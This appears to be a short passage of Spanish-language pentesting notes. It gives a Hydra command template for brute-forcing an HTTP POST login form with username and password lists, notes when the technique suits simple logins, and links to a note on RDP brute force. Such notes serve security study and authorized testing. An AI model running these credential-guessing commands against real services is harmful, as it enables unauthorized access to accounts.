...
#### Hydra para HTTP POST (APIs / login simple)

```bash
hydra -L users.txt -P passwords.txt <ip> http-post-form "/login:usuario=^USER^&password=^PASS^:F=incorrect"
```

Se usa cuando:

- El login NO usa HTML complejo
- No hay tokens dinámicos
### 6. RDP

**[[Explotación RDP#1. Fuerza bruta con hydra]]
